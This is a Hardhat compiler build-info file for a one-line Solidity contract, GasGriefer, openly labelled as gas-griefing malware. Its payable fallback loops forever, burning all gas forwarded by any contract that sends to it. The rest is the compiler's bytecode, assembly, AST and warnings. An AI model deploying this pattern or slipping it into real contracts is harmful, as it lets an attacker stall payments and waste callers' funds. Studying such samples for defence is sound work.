{
	"id": "6b2ad0da7551de308c0295ec55212a98",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.29",
	"solcLongVersion": "0.8.29+commit.ab55807c",
	"input": {
		"language": "Solidity",
		"sources": {
			"M/Gas Griefing Malware (Denial-of-Service).sol": {
				"content": "contract GasGriefer {\n    fallback() external payable {\n        while (true) {} // Infinite loop â†’ blocks all gas\n    }\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"M/Gas Griefing Malware (Denial-of-Service).sol": {
				"GasGriefer": {
					"abi": [
						{
							"stateMutability": "payable",
							"type": "fallback"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"M/Gas Griefing Malware (Denial-of-Service).sol\":0:123  contract GasGriefer {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"M/Gas Griefing Malware (Denial-of-Service).sol\":0:123  contract GasGriefer {... */\n      mstore(0x40, 0x80)\n        /* \"M/Gas Griefing Malware (Denial-of-Service).sol\":64:79  while (true) {} */\n    tag_5:\n        /* \"M/Gas Griefing Malware (Denial-of-Service).sol\":71:75  true */\n      0x01\n        /* \"M/Gas Griefing Malware (Denial-of-Service).sol\":64:79  while (true) {} */\n      tag_5\n      jumpi\n        /* \"M/Gas Griefing Malware (Denial-of-Service).sol\":0:123  contract GasGriefer {... */\n      stop\n\n    auxdata: 0xa2646970667358221220d14377ad34255837f88703621a592dc572f1b71417bfc68025ba5bc7827fb40064736f6c634300081d0033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "6080604052348015600e575f5ffd5b50604280601a5f395ff3fe60806040525b600160055700fea2646970667358221220d14377ad34255837f88703621a592dc572f1b71417bfc68025ba5bc7827fb40064736f6c634300081d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x42 DUP1 PUSH1 0x1A PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE JUMPDEST PUSH1 0x1 PUSH1 0x5 JUMPI STOP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DATALOADN 0x4377 0xAD CALLVALUE 0x25 PC CALLDATACOPY EXTCALL DUP8 SUB PUSH3 0x1A592D 0xC5 PUSH19 0xF1B71417BFC68025BA5BC7827FB40064736F6C PUSH4 0x4300081D STOP CALLER ",
							"sourceMap": "0:123:0:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_7": {
									"entryPoint": null,
									"id": 7,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "60806040525b600160055700fea2646970667358221220d14377ad34255837f88703621a592dc572f1b71417bfc68025ba5bc7827fb40064736f6c634300081d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE JUMPDEST PUSH1 0x1 PUSH1 0x5 JUMPI STOP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DATALOADN 0x4377 0xAD CALLVALUE 0x25 PC CALLDATACOPY EXTCALL DUP8 SUB PUSH3 0x1A592D 0xC5 PUSH19 0xF1B71417BFC68025BA5BC7827FB40064736F6C PUSH4 0x4300081D STOP CALLER ",
							"sourceMap": "0:123:0:-:0;;;64:15;71:4;64:15;;0:123"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "13200",
								"executionCost": "67",
								"totalCost": "13267"
							},
							"external": {
								"": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 0,
									"end": 123,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 0,
									"end": 123,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 0,
									"end": 123,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 0,
									"end": 123,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 0,
									"end": 123,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 0,
									"end": 123,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 0,
									"end": 123,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 0,
									"end": 123,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 0,
									"end": 123,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 0,
									"end": 123,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 0,
									"end": 123,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 0,
									"end": 123,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 0,
									"end": 123,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 0,
									"end": 123,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 0,
									"end": 123,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 0,
									"end": 123,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 0,
									"end": 123,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 0,
									"end": 123,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 0,
									"end": 123,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 0,
									"end": 123,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 0,
									"end": 123,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220d14377ad34255837f88703621a592dc572f1b71417bfc68025ba5bc7827fb40064736f6c634300081d0033",
									".code": [
										{
											"begin": 0,
											"end": 123,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 0,
											"end": 123,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 0,
											"end": 123,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 64,
											"end": 79,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 64,
											"end": 79,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 71,
											"end": 75,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 64,
											"end": 79,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 64,
											"end": 79,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 0,
											"end": 123,
											"name": "STOP",
											"source": 0
										}
									]
								}
							},
							"sourceList": [
								"M/Gas Griefing Malware (Denial-of-Service).sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.29+commit.ab55807c\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"stateMutability\":\"payable\",\"type\":\"fallback\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"M/Gas Griefing Malware (Denial-of-Service).sol\":\"GasGriefer\"},\"evmVersion\":\"cancun\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"M/Gas Griefing Malware (Denial-of-Service).sol\":{\"keccak256\":\"0xd28f0948b898c4baac0c908067cb0af557dec587fc046044874fbb39fa95dbf4\",\"urls\":[\"bzz-raw://f2a494d9fb4a9187fdf256777377d359bae4b06d269508b0db8a8e661e73237d\",\"dweb:/ipfs/QmTXHmeSemPEgfHHnygVgst7u67QA7uiPxRNAwdBuUgCSk\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "1878",
				"formattedMessage": "Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n--> M/Gas Griefing Malware (Denial-of-Service).sol\n\n",
				"message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "M/Gas Griefing Malware (Denial-of-Service).sol",
					"start": -1
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "3420",
				"formattedMessage": "Warning: Source file does not specify required compiler version! Consider adding \"pragma solidity ^0.8.29;\"\n--> M/Gas Griefing Malware (Denial-of-Service).sol\n\n",
				"message": "Source file does not specify required compiler version! Consider adding \"pragma solidity ^0.8.29;\"",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "M/Gas Griefing Malware (Denial-of-Service).sol",
					"start": -1
				},
				"type": "Warning"
			}
		],
		"sources": {
			"M/Gas Griefing Malware (Denial-of-Service).sol": {
				"ast": {
					"absolutePath": "M/Gas Griefing Malware (Denial-of-Service).sol",
					"exportedSymbols": {
						"GasGriefer": [
							8
						]
					},
					"id": 9,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "GasGriefer",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 8,
							"linearizedBaseContracts": [
								8
							],
							"name": "GasGriefer",
							"nameLocation": "9:10:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 6,
										"nodeType": "Block",
										"src": "54:67:0",
										"statements": [
											{
												"body": {
													"id": 4,
													"nodeType": "Block",
													"src": "77:2:0",
													"statements": []
												},
												"condition": {
													"hexValue": "74727565",
													"id": 3,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "71:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"id": 5,
												"nodeType": "WhileStatement",
												"src": "64:15:0"
											}
										]
									},
									"id": 7,
									"implemented": true,
									"kind": "fallback",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "34:2:0"
									},
									"returnParameters": {
										"id": 2,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "54:0:0"
									},
									"scope": 8,
									"src": "26:95:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 9,
							"src": "0:123:0",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "0:124:0"
				},
				"id": 0
			}
		}
	}
}